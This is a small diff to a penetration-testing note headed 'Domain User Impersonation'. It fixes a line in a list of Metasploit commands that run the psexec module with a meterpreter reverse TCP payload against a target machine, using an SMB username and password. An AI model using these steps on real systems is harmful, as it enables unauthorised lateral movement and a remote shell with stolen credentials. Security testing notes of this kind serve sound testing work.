@@ -3,8 +3,7 @@
 ### Domain User Impersonation
 - Load metasploit
 - `use exploit/windows/smb/psexec`
-- `set payload windows/x64/meterpreter/reverse_tcp
-payload`
+- `set payload windows/x64/meterpreter/reverse_tcp`
 - `set rhost <user machine IP>`
 - `set smbuser <username>`
 - `set smbpass <password>`
